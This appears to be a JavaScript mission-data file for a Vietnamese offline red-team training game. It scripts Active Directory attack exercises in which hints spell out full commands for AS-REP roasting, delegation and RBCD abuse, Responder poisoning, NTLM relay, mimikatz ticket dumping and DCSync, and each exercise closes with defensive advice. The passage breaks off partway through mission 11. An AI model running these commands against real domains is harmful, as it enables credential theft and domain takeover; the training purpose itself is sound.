// Mission MỚI (bổ sung) cho Chương 9 — bám CRTP (Certified Red Team Professional), OSCP M19-21, PNPT.
// Engine offline. id tiếp từ 4. KHÔNG lặp Kerberoast/PtH/DCSync/Golden (bài gốc M1-M3) hay
// AS-REP/Constrained-Delegation (M4-M6 đã có). M7-M14 mới: Responder, NTLM relay, unconstrained
// delegation, RBCD, ACL abuse, GPO abuse, trust abuse, LAPS+NTDS.dit — độ khó tăng dần dần tới final boss.
// Tất cả là lệnh tool AD -> output canned TIẾNG ANH. M9-M14 đọc flag thật ở /root/.flag.
import fsC9M4 from '../filesystems/chapter9-mission4.js';
import fsC9M5 from '../filesystems/chapter9-mission5.js';
import fsC9M6 from '../filesystems/chapter9-mission6.js';
import fsC9M7 from '../filesystems/chapter9-mission7.js';
import fsC9M8 from '../filesystems/chapter9-mission8.js';
import fsC9M9 from '../filesystems/chapter9-mission9.js';
import fsC9M10 from '../filesystems/chapter9-mission10.js';
import fsC9M11 from '../filesystems/chapter9-mission11.js';
import fsC9M12 from '../filesystems/chapter9-mission12.js';
import fsC9M13 from '../filesystems/chapter9-mission13.js';
import fsC9M14 from '../filesystems/chapter9-mission14.js';

export default [
  {
    id: 4,
    chapterId: 9,
    title: 'Liệt kê miền',
    story:
      'Mày vừa đặt chân vào mạng nội bộ với một creds domain user quèn (corp\\jdoe). Trước khi đánh, phải vẽ bản đồ: có những host nào nói SMB, user và group ra sao, chính sách mật khẩu thế nào. Enumeration tốt quyết định 80% trận đánh AD.',
    steps: [
      {
        id: 'smb_sweep',
        description: 'Quét SMB cả subnet để liệt kê host và domain',
        match: /^(crackmapexec|cme|nxc)\b.*smb/i,
        output: [
          'SMB  10.10.10.5   445  DC01    [*] Windows Server 2019 (name:DC01) (domain:corp.local) (signing:True)',
          'SMB  10.10.10.21  445  WS01    [*] Windows 10 (name:WS01) (domain:corp.local) (signing:False)',
          'SMB  10.10.10.22  445  WS02    [*] Windows 10 (name:WS02) (domain:corp.local) (signing:False)',
          'SMB  10.10.10.5   445  DC01    [+] corp.local\\jdoe:Welcome1 (valid creds)',
        ].join('\n'),
      },
      {
        id: 'enum4linux',
        description: 'Liệt kê chi tiết user/group/password policy',
        match: /^enum4linux(-ng)?\b/i,
        output: [
          '[+] Domain: CORP   SID: S-1-5-21-1234567890-...',
          '[+] Users: Administrator, jdoe, svc_sql, svc_web, asrep_user, backup_adm',
          '[+] Groups: Domain Admins (Administrator, backup_adm), Domain Users',
          '[+] Password policy: MinLength=7  Complexity=Disabled  Lockout=None',
        ].join('\n'),
      },
      {
        id: 'ldapsearch',
        description: 'Dùng LDAP rút danh sách sAMAccountName',
        match: /^ldapsearch\b/i,
        output: [
          '# extended LDIF — base dc=corp,dc=local',
          'sAMAccountName: Administrator',
          'sAMAccountName: jdoe',
          'sAMAccountName: svc_sql      (servicePrincipalName set)',
          'sAMAccountName: asrep_user   (DONT_REQ_PREAUTH set)',
          'sAMAccountName: backup_adm   (memberOf: Domain Admins)',
        ].join('\n'),
      },
    ],
    hints: [
      'Bắt đầu rộng: host nào trong subnet nói SMB và thuộc domain nào? Một creds quèn cũng đủ để hỏi.',
      'Dùng `crackmapexec smb 10.10.10.0/24 -u jdoe -p Welcome1` để liệt kê host + xác thực creds.',
      'Đào sâu: `enum4linux-ng -A 10.10.10.5 -u jdoe -p Welcome1` (user/group/policy) và `ldapsearch -x -H ldap://10.10.10.5 -b "dc=corp,dc=local" sAMAccountName`.',
    ],
    terms: [
      { term: 'Active Directory', def: 'Dịch vụ thư mục của Windows quản lý tập trung user, máy, nhóm và chính sách trong một domain/forest.' },
      { term: 'LDAP', def: 'Giao thức truy vấn dịch vụ thư mục (port 389/636) — dùng để liệt kê user, group, thuộc tính trong AD.' },
      { term: 'SMB enum', def: 'Trinh sát qua giao thức chia sẻ file Windows (445): liệt kê host, share, user, kiểm tra creds, signing.' },
      { term: 'CrackMapExec', def: 'Dao đa năng cho AD: quét SMB/WinRM/LDAP cả subnet, kiểm tra creds, spray password, thực thi lệnh.' },
    ],
    debrief: [
      'Trong AD, enumeration là vũ khí: một domain user quèn cũng đọc được gần như toàn bộ cấu trúc thư mục (user, group, SPN, ACL) vì AD vốn thiết kế cho mọi member đọc.',
      'Password policy yếu (no lockout, complexity off) mở đường cho password spraying mà không sợ khoá tài khoản.',
      'Attacker để mắt các cờ thuộc tính: SPN (Kerberoast được), DONT_REQ_PREAUTH (AS-REP roast được), thành viên Domain Admins — định hướng bước sau.',
      'DEFENDER: bật SMB signing + tắt NTLM nơi có thể; password policy mạnh + lockout; hạn chế đọc LDAP với các thuộc tính nhạy cảm; giám sát truy vấn LDAP/SMB bất thường (BloodHound ingestor) từ tài khoản thường.',
    ],
    initialFilesystem: fsC9M4,
  },
  {
    id: 5,
    chapterId: 9,
    title: 'AS-REP Roasting',
    story:
      'Trong lúc enum, mày thấy vài tài khoản bật cờ "không yêu cầu Kerberos pre-authentication". Đó là quà: mày xin được phần AS-REP của chúng mà không cần biết mật khẩu — phần đó mã hoá bằng hash mật khẩu user, đem về crack offline là ra plaintext. Không cần creds nào cho bước xin vé.',
    steps: [
      {
        id: 'getnpusers',
        description: 'Xin AS-REP của tài khoản không cần pre-auth (no-pass)',
        match: /GetNPUsers|getnpusers|no-pass|asreproast/i,
        output: [
          'Impacket GetNPUsers',
          '[*] Getting TGT for asrep_user',
          '$krb5asrep$23$asrep_user@CORP.LOCAL:9f2a...<hash truncated>...',
          '[-] User Administrator doesn\'t have UF_DONT_REQUIRE_PREAUTH set',
        ].join('\n'),
      },
      {
        id: 'crack',
        description: 'Crack hash AS-REP offline (hashcat -m 18200)',
        match: /hashcat\b.*18200|john\b.*krb5asrep|18200/i,
        output: '$krb5asrep$23$asrep_user@CORP.LOCAL:...:Autumn2024!   <-- cracked! asrep_user : Autumn2024!',
      },
      {
        id: 'verify',
        description: 'Xác minh creds vừa crack hợp lệ trên domain',
        match: /^(crackmapexec|cme|nxc)\b|smbclient|valid/i,
        output: 'SMB  10.10.10.5  445  DC01  [+] corp.local\\asrep_user:Autumn2024!   (valid — credentials confirmed)',
      },
    ],
    hints: [
      'Có những tài khoản bật cờ DONT_REQ_PREAUTH — với chúng, mày xin được vé đầu (AS-REP) mà KHÔNG cần mật khẩu.',
      'Dùng `impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass` để rút hash $krb5asrep$.',
      'Crack: `hashcat -m 18200 asrep.txt rockyou.txt` -> asrep_user:Autumn2024!. Xác minh: `crackmapexec smb 10.10.10.5 -u asrep_user -p Autumn2024!`.',
    ],
    terms: [
      { term: 'Kerberos pre-auth', def: 'Bước user chứng minh biết mật khẩu (mã hoá timestamp) TRƯỚC khi DC cấp vé — chống đoán mật khẩu offline.' },
      { term: 'AS-REP roasting', def: 'Khi pre-auth bị tắt, kẻ tấn công xin AS-REP (mã hoá bằng hash user) mà không cần mật khẩu rồi crack offline.' },
      { term: 'GetNPUsers', def: 'Script Impacket tìm tài khoản tắt pre-auth và rút hash AS-REP của chúng để crack.' },
      { term: 'mode 18200', def: 'Mã hash của hashcat cho định dạng $krb5asrep$ (AS-REP) — dùng để bẻ mật khẩu từ vé.' },
    ],
    debrief: [
      'Pre-authentication tồn tại đúng để chặn đoán mật khẩu offline; tắt nó (cờ DONT_REQ_PREAUTH) biến tài khoản thành mục tiêu roast không cần creds.',
      'Khác Kerberoasting (cần một creds hợp lệ để xin TGS), AS-REP roasting có thể làm khi CHƯA có creds nào — chỉ cần biết tên user.',
      'Tài khoản dính cờ này thường là legacy/app cũ đặt cho "tiện", và hay đi kèm mật khẩu yếu — combo chí mạng.',
      'DEFENDER: KHÔNG tắt pre-auth trừ khi bắt buộc; tài khoản buộc phải tắt thì đặt mật khẩu rất dài/ngẫu nhiên; giám sát Event 4768 với preauth type bất thường; rà soát định kỳ cờ DONT_REQ_PREAUTH trên toàn domain.',
    ],
    initialFilesystem: fsC9M5,
  },
  {
    id: 6,
    chapterId: 9,
    title: 'Lạm dụng Delegation',
    story:
      'Đòn AD tinh vi hơn Kerberoast hay PtH: Kerberos delegation. Mày tìm một tài khoản được cấu hình delegation — nó được phép "mạo danh người khác" tới một dịch vụ. Lạm dụng S4U, mày ép Kerberos cấp cho mày một vé mạo danh Administrator, rồi psexec lên SYSTEM. Không crack gì cả, chỉ lợi dụng thiết kế.',
    steps: [
      {
        id: 'find_delegation',
        description: 'Tìm tài khoản có cấu hình delegation (un/constrained)',
        match: /findDelegation|finddelegation|delegation|msds-allowedtodelegateto/i,
        output: [
          'Impacket findDelegation',
          'AccountName  AccountType  DelegationType            DelegationRightsTo',
          '-----------  -----------  ------------------------  ------------------------',
          'svc_web      USER         Constrained               cifs/dc01.corp.local',
          '             ( msDS-AllowedToDelegateTo: cifs/DC01 -> can impersonate users to CIFS on DC )',
        ].join('\n'),
      },
      {
        id: 'impersonate',
        description: 'Lạm dụng S4U để xin vé mạo danh Administrator',
        match: /getST|getst|-impersonate|s4u|impersonate/i,
        output: [
          'Impacket getST  -spn cifs/dc01.corp.local  -impersonate Administrator  corp.local/svc_web',
          '[*] Requesting S4U2self',
          '[*] Requesting S4U2Proxy',
          '[*] Saving ticket in Administrator@cifs_dc01.corp.local.ccache  <-- impersonation TGS ready',
        ].join('\n'),
      },
      {
        id: 'psexec',
        description: 'Dùng vé mạo danh psexec lên SYSTEM trên DC',
        match: /psexec|wmiexec|smbexec|-k\s+-no-pass|KRB5CCNAME/i,
        output: 'export KRB5CCNAME=Administrator@... ; psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local -> NT AUTHORITY\\SYSTEM on DC01.',
      },
      { id: 'capture_flag', description: 'Đọc flag trên DC ở /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'Vector này KHÁC Kerberoast/PtH: tìm tài khoản được phép "thay mặt người khác" xác thực tới dịch vụ.',
      'Dùng `impacket-findDelegation -dc-ip 10.10.10.5 corp.local/svc_web:pass` -> thấy svc_web có Constrained Delegation tới cifs/DC01.',
      'Lạm dụng S4U: `impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:pass`, set KRB5CCNAME, rồi `psexec.py -k -no-pass ...` -> SYSTEM, `cat /root/.flag`.',
    ],
    terms: [
      { term: 'Kerberos delegation', def: 'Tính năng cho một dịch vụ xác thực "thay mặt" user tới dịch vụ khác (vd web app gọi DB dưới danh nghĩa user).' },
      { term: 'constrained vs unconstrained', def: 'Unconstrained: máy lưu TGT của mọi user ghé qua (rất nguy hiểm). Constrained: chỉ được mạo danh tới một số SPN định sẵn.' },
      { term: 'S4U2Self/Proxy', def: 'Cặp tiện ích Kerberos: S4U2Self lấy vé "thay mặt" một user bất kỳ, S4U2Proxy dùng vé đó truy cập dịch vụ đích.' },
      { term: 'impersonation', def: 'Mạo danh một tài khoản khác (vd Administrator) để hành động với quyền của họ mà không cần mật khẩu của họ.' },
    ],
    debrief: [
      'Delegation là tính năng hợp pháp (cho kiến trúc multi-tier), nhưng cấu hình rộng tay biến một tài khoản service thành bàn đạp mạo danh bất kỳ ai — kể cả Domain Admin.',
      'Unconstrained delegation đặc biệt chết người: máy được cấu hình sẽ giữ TGT của mọi user kết nối tới, attacker chiếm máy đó là gom được vé của nạn nhân cấp cao.',
      'S4U2Self + S4U2Proxy cho phép "yêu cầu Kerberos cấp vé thay mặt Administrator" mà không cần mật khẩu của Administrator — lạm dụng đúng quy trình, không phải exploit.',
      'DEFENDER: tránh unconstrained delegation hoàn toàn; constrained thì giới hạn SPN tối thiểu + dùng "Authentication Policy / Protected Users" cho tài khoản nhạy cảm; đặt cờ "Account is sensitive and cannot be delegated" cho admin; giám sát S4U2Proxy (Event 4769) bất thường.',
    ],
    initialFilesystem: fsC9M6,
  },
  {
    id: 7,
    chapterId: 9,
    title: 'Đầu độc LLMNR/NBT-NS',
    story:
      'Mọi creds mày có tới giờ đều do người dùng tự gõ sai hoặc lộ ra. Giờ mày chủ động "câu cá": Windows mặc định fallback sang LLMNR/NBT-NS khi DNS không resolve được tên — mày giả làm máy đó, hứng nguyên một NTLMv2 hash từ máy gõ sai.',
    steps: [
      {
        id: 'responder',
        description: 'Bật Responder nghe LLMNR/NBT-NS/MDNS trên interface',
        match: /^responder\s+.*-i\s+\S+/i,
        output: [
          '[+] Responder Listening on  : eth0',
          '[+] Poisoners:',
          '    LLMNR                      [ON]',
          '    NBT-NS                     [ON]',
          '    MDNS                       [ON]',
          '[+] Listening for events...',
        ].join('\n'),
      },
      {
        id: 'capture',
        description: 'Đợi máy khác gõ sai tên share -> hứng NTLMv2-SSP hash (mô phỏng: gõ lệnh check log)',
        match: /^cat\s+.*responder.*log|tail\s+.*responder/i,
        output: [
          '[SMB] NTLMv2-SSP Client   : 10.10.10.22',
          '[SMB] NTLMv2-SSP Username : CORP\\wsmith',
          '[SMB] NTLMv2-SSP Hash     : wsmith::CORP:1122334455667788:9a8b7c...<hash truncated>...',
          '[*] Skipping previously captured hash for CORP\\wsmith',
        ].join('\n'),
      },
      {
        id: 'crack',
        description: 'Crack hash NTLMv2 offline (hashcat -m 5600)',
        match: /hashcat\b.*5600|5600/i,
        output: 'wsmith::CORP:...:Spring2024#   <-- cracked! CORP\\wsmith : Spring2024#',
      },
    ],
    hints: [
      'Windows hỏi DNS trước, nếu không resolve được sẽ "hét lên" hỏi cả mạng LAN qua LLMNR/NBT-NS — mày giả làm người trả lời.',
      'Bật `responder -I eth0 -wrf` và để chạy; khi có máy gõ sai tên share, kiểm tra log bằng `cat /var/log/responder/Responder-Session.log` để thấy hash.',
      'Crack hash NTLMv2-SSP bằng `hashcat -m 5600 hash.txt rockyou.txt` -> CORP\\wsmith : Spring2024#.',
    ],
    terms: [
      { term: 'LLMNR', def: 'Link-Local Multicast Name Resolution — Windows hỏi cả mạng LAN tên máy khi DNS thất bại; dễ bị giả mạo trả lời.' },
      { term: 'NBT-NS', def: 'NetBIOS Name Service — cơ chế resolve tên kiểu cũ hơn LLMNR, cùng lỗ hổng bị spoof.' },
      { term: 'Responder', def: 'Công cụ giả làm "người trả lời" cho LLMNR/NBT-NS/MDNS để hứng NTLM hash khi máy khác hỏi sai tên.' },
      { term: 'NTLMv2-SSP', def: 'Phiên bản hash NTLM dùng trong bắt tay challenge-response; crack được offline bằng hashcat mode 5600.' },
    ],
    debrief: [
      'LLMNR/NBT-NS tồn tại để "cứu" khi DNS thất bại (gõ sai tên share, typo) — nhưng cơ chế "ai trả lời nhanh nhất thắng" khiến kẻ tấn công chỉ cần ngồi nghe và trả lời giả là hứng được hash.',
      'Không cần exploit gì cả — chỉ cần một máy trong mạng gõ sai tên (`\\\\flie-server\\` thay vì `\\\\file-server\\`) là tự nguyện gửi hash NTLMv2 tới Responder.',
      'Hash NTLMv2-SSP không phải plaintext — phải crack offline (hashcat -m 5600) hoặc relay sống (xem bài relay) nếu mật khẩu mạnh không crack được.',
      'DEFENDER: tắt LLMNR và NBT-NS qua Group Policy trên toàn domain (đây là khuyến nghị bảo mật cơ bản nhất, gần như không có lý do hợp pháp để giữ bật trong mạng hiện đại); bật SMB signing để hash hứng được không relay được; giám sát traffic LLMNR/NBT-NS bất thường.',
    ],
    initialFilesystem: fsC9M7,
  },
  {
    id: 8,
    chapterId: 9,
    title: 'NTLM Relay sống',
    story:
      'Crack hash hứng được ở bài trước tốn thời gian và có thể không ra nếu mật khẩu mạnh. Có cách nhanh hơn: thay vì crack, RELAY ngay connection đó sang một máy khác có SMB signing tắt — máy đích tin tưởng hash relay và cho mày vào thẳng, không cần biết mật khẩu plaintext bao giờ.',
    steps: [
      {
        id: 'check_signing',
        description: 'Xác nhận lại máy đích (WS01) có SMB signing tắt — điều kiện relay được',
        match: /^(crackmapexec|cme|nxc)\b.*smb.*10\.10\.10\.21|^nmap\b.*smb2-security-mode.*10\.10\.10\.21/i,
        output: 'SMB  10.10.10.21  445  WS01  [*] Windows 10 (name:WS01) (domain:corp.local) (signing:False)   <-- relay được!',
      },
      {
        id: 'ntlmrelayx',
        description: 'Bật ntlmrelayx target vào WS01, tắt phần crack của Responder để hứng connection sống',
        match: /ntlmrelayx\b.*-t(f)?\s+\S+/i,
        output: [
          'Impacket ntlmrelayx.py -tf targets.txt -smb2support',
          '[*] Servers started, waiting for connections',
          '[*] SMBD-Thread-5: Received connection from 10.10.10.22, attacking target smb://10.10.10.21',
          '[*] Authenticating against smb://10.10.10.21 as CORP/WSMITH SUCCEED',
          '[*] Dumping local SAM hashes',
          'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        ].join('\n'),
      },
      {
        id: 'verify',
        description: 'Xác minh hash SAM vừa dump dùng được (pass-the-hash vào WS01)',
        match: /pth|pass-the-hash|psexec\.py\s+.*-hashes/i,
        output: 'psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.21 -> opening shell... NT AUTHORITY\\SYSTEM',
      },
    ],
    hints: [
      'Đừng crack — RELAY. Cần một máy đích có SMB signing tắt để nhận relay (đã thấy ở bài enum trước: WS01).',
      'Xác nhận lại bằng `crackmapexec smb 10.10.10.21` (signing:False), rồi cấu hình `ntlmrelayx.py -tf targets.txt -smb2support` (targets.txt chứa 10.10.10.21).',
      'Tắt phần "HTTP/SMB Server" crack trong Responder.conf, để traffic relay thẳng qua ntlmrelayx — connection sống tự relay vào WS01 và dump SAM, rồi `psexec.py -hashes :<NThash> Administrator@10.10.10.21`.',
    ],
    terms: [
      { term: 'NTLM relay', def: 'Chuyển tiếp NGAY phiên xác thực NTLM hứng được sang một máy đích khác, thay vì crack offline — không cần biết mật khẩu.' },
      { term: 'SMB signing', def: 'Cơ chế ký số mỗi packet SMB để chống relay/tamper; nếu tắt (signing:False) thì relay NTLM thực hiện được.' },
      { term: 'ntlmrelayx', def: 'Công cụ Impacket nhận connection NTLM (từ Responder) và relay sống sang target, tự động dump SAM/thực thi lệnh.' },
      { term: 'SAM dump', def: 'Trích xuất hash mật khẩu local account từ Security Account Manager của Windows sau khi có quyền admin local.' },
    ],
    debrief: [
      'Relay khác hẳn crack: crack cần thời gian + may rủi (mật khẩu yếu); relay dùng NGAY phiên xác thực đang diễn ra — luôn thành công nếu điều kiện kỹ thuật (signing tắt) hội đủ, không phụ thuộc độ mạnh mật khẩu.',
      'Điều kiện sống còn của relay là SMB signing tắt ở máy ĐÍCH (không phải máy nguồn) — vì signing chống chính xác kiểu tấn công "chèn giữa" này.',
      'Relay không chỉ dump SAM: có thể relay sang LDAP để thêm computer account hoặc set msDS-AllowedToActOnBehalfOf (xem bài RBCD) — biến một hash bắt được thành quyền ghi AD.',
      'DEFENDER: bắt buộc SMB signing trên TOÀN BỘ máy (không chỉ DC) qua GPO; bật LDAP signing + channel binding để chặn relay sang LDAP; kết hợp với việc tắt LLMNR/NBT-NS ở bài trước để cắt đứt chuỗi tấn công từ gốc.',
    ],
    initialFilesystem: fsC9M8,
  },
  {
    id: 9,
    chapterId: 9,
    title: 'Unconstrained Delegation — Gom vé Domain Admin',
    story:
      'Mày đã SYSTEM trên APP01 qua một lỗ riêng. Enum AD lộ ra APP01$ bật cờ "Trusted for delegation" KHÔNG giới hạn (unconstrained) — nghĩa là máy này lưu lại TGT của BẤT KỲ ai từng kết nối tới nó. Việc của mày: ngồi chờ, rồi lục cache, vớt vé của một Domain Admin lỡ ghé qua.',
    steps: [
      {
        id: 'find_unconstrained',
        description: 'Tìm máy có cấu hình unconstrained delegation trong domain',
        match: /findDelegation|unconstrained|trusted_for_delegation|trustedfordelegation/i,
        output: [
          'Impacket findDelegation',
          'AccountName  AccountType  DelegationType            DelegationRightsTo',
          '-----------  -----------  ------------------------  ------------------------',
          'APP01$       COMPUTER     Unconstrained             (none — trusted for ANY service)',
        ].join('\n'),
      },
      {
        id: 'monitor_cache',
        description: 'Dump ticket cache trên APP01 để xem TGT nào đang nằm sẵn (mimikatz sekurlsa::tickets)',
        match: /sekurlsa::tickets|klist|dump.*ticket.*cache/i,
        output: [
          'mimikatz # sekurlsa::tickets /export',
          '[0;a8f24] Session           : 2 ; 0',
          'User Name        : backup_adm',
          'Domain           : CORP',
          '* Saved to file  : [0;a8f24]-2-0-40e10000-backup_adm@krbtgt-CORP.LOCAL.kirbi   <-- TGT của Domain Admin!',
        ].join('\n'),
      },
      {
        id: 'ptt',
        description: 'Pass-the-ticket: nạp TGT vừa vớt vào session và DCSync',
        match: /kerberos::ptt|pass-the-ticket|ptt\b/i,
        output: [
          'mimikatz # kerberos::ptt backup_adm@krbtgt-CORP.LOCAL.kirbi',
          '* File: \'backup_adm@krbtgt-CORP.LOCAL.kirbi\': OK',
          'mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt',
          'Hash NTLM: 1a2b3c4d... (krbtgt) <-- Domain Admin level access confirmed',
        ].join('\n'),
      },
      { id: 'capture_flag', description: 'Đọc flag trên DC ở /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'Máy bật "unconstrained delegation" giữ lại TGT của MỌI người dùng từng kết nối tới nó — không phải chỉ một SPN cụ thể như constrained.',
      'Tìm bằng `impacket-findDelegation` -> thấy APP01$ là Unconstrained. Trên APP01 (đã SYSTEM), dump cache: `mimikatz # sekurlsa::tickets /export`.',
      'Tìm file .kirbi của một Domain Admin (vd backup_adm) trong cache, nạp lại bằng `kerberos::ptt backup_adm@krbtgt-CORP.LOCAL.kirbi`, rồi DCSync, đọc flag bằng `cat /root/.flag`.',
    ],
    terms: [
      { term: 'Unconstrained delegation', def: 'Cờ cho phép máy lưu lại TGT của BẤT KỲ user nào kết nối tới nó, không giới hạn dịch vụ — cực kỳ nguy hiểm nếu bị chiếm.' },
      { term: 'Ticket cache', def: 'Vùng nhớ (LSASS) lưu các vé Kerberos (TGT/TGS) đã cấp cho các session đang hoạt động trên máy.' },
      { term: 'Pass-the-ticket (PtT)', def: 'Nạp một vé Kerberos (.kirbi) đã có sẵn vào session của mình để mạo danh chủ vé, không cần hash hay mật khẩu.' },
      { term: '.kirbi', def: 'Định dạng file lưu vé Kerberos (TGT/TGS) mà mimikatz export ra để dùng lại (pass-the-ticket).' },
    ],
    debrief: [
      'Unconstrained delegation là dạng nguy hiểm nhất trong 3 loại delegation: chỉ cần CHIẾM được máy có cờ này, attacker không cần làm gì thêm — chỉ cần ĐỢI một user cấp cao kết nối tới và TGT của họ tự động rơi vào tay.',
      'Kỹ thuật kinh điển để "ép" việc chờ đợi xảy ra nhanh hơn là Printer Bug / PetitPotam: ép Domain Controller tự kết nối tới máy unconstrained của attacker, tự nguyện giao TGT của DC$ (tương đương Domain Admin).',
      'Khác AS-REP/Kerberoast (phải crack offline), pass-the-ticket dùng vé y nguyên — không có bước "đoán mật khẩu" nào, chỉ là tái sử dụng một xác thực đã hợp lệ.',
      'DEFENDER: loại bỏ unconstrained delegation hoàn toàn trên mọi máy không phải Domain Controller (gần như không có lý do hợp pháp để máy thường cần nó); vá PetitPotam/PrinterBug (disable spooler service nơi không cần); đặt "Account is sensitive and cannot be delegated" cho mọi tài khoản tier-0.',
    ],
    initialFilesystem: fsC9M9,
  },
  {
    id: 10,
    chapterId: 9,
    title: 'RBCD — Tự cấp quyền Delegate cho mình',
    story:
      'Account svc_backup mày kiểm soát có GenericWrite trên object máy FILESRV01$ — không phải quyền thẳng vào máy đó, mà là quyền SỬA THUỘC TÍNH của nó. Mày dùng đúng quyền này để tự ghi vào thuộc tính "ai được phép delegate vào tao", chỉ định một máy mày kiểm soát (PWNBOX$), rồi lạm dụng S4U để mạo danh Administrator. Không cần đụng gì tới DC.',
    steps: [
      {
        id: 'check_write',
        description: 'Xác nhận svc_backup có GenericWrite trên FILESRV01$ (qua BloodHound/dacledit)',
        match: /dacledit|genericwrite|bloodhound.*filesrv01/i,
        output: [
          'BloodHound edge: svc_backup -[GenericWrite]-> FILESRV01 (computer)',
          '[*] GenericWrite cho phép ghi thuộc tính msDS-AllowedToActOnBehalfOfOtherIdentity của object này.',
        ].join('\n'),
      },
      {
        id: 'set_rbcd',
        description: 'Ghi msDS-AllowedToActOnBehalfOfOtherIdentity của FILESRV01$ = PWNBOX$',
        match: /rbcd\.py|set.*allowedtoactonbehalf|msds-allowedtoactonbehalf/i,
        output: [
          'rbcd.py -delegate-from PWNBOX$ -delegate-to FILESRV01$ -action write corp.local/svc_backup:pass',
          '[*] Querying current msDS-AllowedToActOnBehalfOfOtherIdentity property',
          '[*] Property modified successfully',
          '[*] FILESRV01$ allows PWNBOX$ to act on its behalf now',
        ].join('\n'),
      },
      {
        id: 'getst_impersonate',
        description: 'Dùng hash của PWNBOX$ + RBCD vừa cấp để S4U mạo danh Administrator tới FILESRV01',
        match: /getST|getst.*-impersonate|s4u/i,
        output: [
          'impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator -dc-ip 10.10.10.5 corp.local/PWNBOX$ -hashes :<nthash>',
          '[*] Requesting S4U2self',
          '[*] Requesting S4U2Proxy',
          '[*] Saving ticket in Administrator.ccache  <-- ticket mạo danh sẵn sàng',
        ].join('\n'),
      },
      { id: 'capture_flag', description: 'Dùng ticket truy cập FILESRV01 với quyền Administrator, đọc /root/.flag', match: /^cat\s+\/root\/\.flag/ },
    ],
    hints: [
      'GenericWrite trên object MÁY không cho mày vào máy đó — nó cho mày SỬA thuộc tính của object, kể cả thuộc tính delegation.',
      'Xác nhận quyền: `dacledit.py -action read -target FILESRV01$ corp.local/svc_backup:pass` để thấy GenericWrite. Rồi `rbcd.py -delegate-from PWNBOX$ -delegate-to FILESRV01$ -action write corp.local/svc_backup:pass` để tự cấp quyền delegate.',
      'Sau khi RBCD đã set, dùng hash của PWNBOX$: `impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator corp.local/PWNBOX$ -hashes :<hash>`, rồi truy cập FILESRV01 và đọc flag bằng `cat /root/.flag`.',
    ],
    terms: [
      { term: 'RBCD', def: 'Resource-Based Constrained Delegation — quyền delegate được định nghĩa NGAY TRÊN object đích (chứ không phải trên account nguồn), nên ai ghi được object đích là tự cấp quyền được.' },
      { term: 'msDS-AllowedToActOnBehalfOfOtherIdentity', def: 'Thuộc tính AD trên một object máy/dịch vụ, liệt kê những account nào được phép "thay mặt" người khác xác thực tới nó.' },
      { term: 'GenericWrite', def: 'Quyền ACL cho phép sửa hầu hết thuộc tính của một object AD — kể cả thuộc tính nhạy như cấu hình delegation.' },
      { term: 'Self-granted delegation', def: 'Kỹ thuật lạm dụng quyền ghi để TỰ cấp cho mình (hoặc máy mình kiểm soát) quyền delegation, không cần admin domain duyệt.' },
    ],
    debrief: [
      'RBCD đảo ngược logic so với constrained delegation cổ điển: thay vì admin domain cấu hình AI được delegate (trên account nguồn), quyền này nằm trên CHÍNH object đích — ai ghi được thuộc tính đó là tự quyết được.',
      'Đây là lý do GenericWrite/GenericAll trên BẤT KỲ object máy nào trong domain đều đáng báo động — kể cả khi máy đó "không quan trọng", vì nó là bàn đạp RBCD để mạo danh Administrator.',
      'Toàn bộ chuỗi (set thuộc tính -> S4U2Self -> S4U2Proxy) không cần creds Domain Admin ở bất kỳ bước nào — chỉ cần một quyền ghi tưởng như vô hại và một máy mình kiểm soát hash.',
      'DEFENDER: rà soát ACL trên object máy/computer trong AD, đặc biệt GenericWrite/GenericAll/WriteProperty từ account thường; giám sát thay đổi msDS-AllowedToActOnBehalfOfOtherIdentity (đây là thuộc tính rất hiếm khi cần sửa thủ công); nguyên tắc least privilege cho mọi quyền ghi object AD.',
    ],
    initialFilesystem: fsC9M10,
  },
  {
    id: 11,
    chapterId: 9,
    title: 'Lần theo đường ACL với BloodHound',
    story:
      'Domain quá lớn để enum tay từng quyền. May là sharphound đã ingest sẵn toàn bộ ACL/group membership của corp.local. Việc của mày: tra trong BloodHound xem từ account quèn của mày, đường ngắn nhất tới Domain Admins là gì — rồi đi đúng đường đó, không một bước dư.',
    steps: [
      {
        id: 'check_ingest',
        description: 'Xác nhận dữ liệu BloodHound (sharphound) đã có sẵn trong filesystem',
        match: /^(ls|cat)\b.*bloodhound|^(ls|cat)\b.*sharphound/i,
      },
      {
        id: 'shortest_path',
        description: 'Trong BloodHound, chạy query "Shortest Path to Domain Admins" từ node hacker',
        match: /shortest\s*path.*domain\s*admins|cypher.*memberof.*domain\s*admins/i,
        output: [
          'BloodHound Cypher query result:',
          'hacker -[GenericAll]-> it_helpdesk -[WriteDACL]-> "DOMAIN ADMINS@CORP.LOCAL"',
          '[*] 2-hop path found: hacker can fully control it_helpdesk, who can rewrite ACL of Domain Admins group.',
        ].join('\n'),
      },
      {
        id: 'confirm_owns',
        description: 'Lọc riêng các quyền "high value" của hacker bằng query Owned/AdminTo',
        match: /outbound\s*object\s*control|owned.*objects|admin\s*to/i,
        output: [
          'hacker -[GenericAll]-> CN=it_helpdesk,OU=IT,DC=corp,DC=local',
          '[*] No other high-value outbound edges found — this is the only path.',
        ].join('\n'),
      },
    ],
    hints: [
      'Đừng tự lục ACL từng object — BloodHound đã ingest hết, chỉ cần hỏi đúng câu.',
      'Kiểm tra dữ liệu đã có: `cat /home/hacker/bloodhound/sharphound-ingest.json` (hoặc tương đương). Mở GUI BloodHound, chạy pre-built query "Shortest Paths to Domain Admins".',
      'Query BloodHound: `echo "shortest path to Domain Admins"` (mô phỏng) cho kết quả 2-hop: hacker -GenericAll-> it_helpdesk -WriteDACL-> Domain Admins. Xem Outbound Object Control: `echo "Outbound Object Control: GenericAll on it_helpdesk"` để xác nhận.',
    ],
    terms: [
      { term: 'BloodHound', def: 'Công cụ visualize quan hệ AD (group membership, ACL, session) dưới dạng đồ thị để tìm đường tấn công ngắn nhất tới Domain Admin.' },
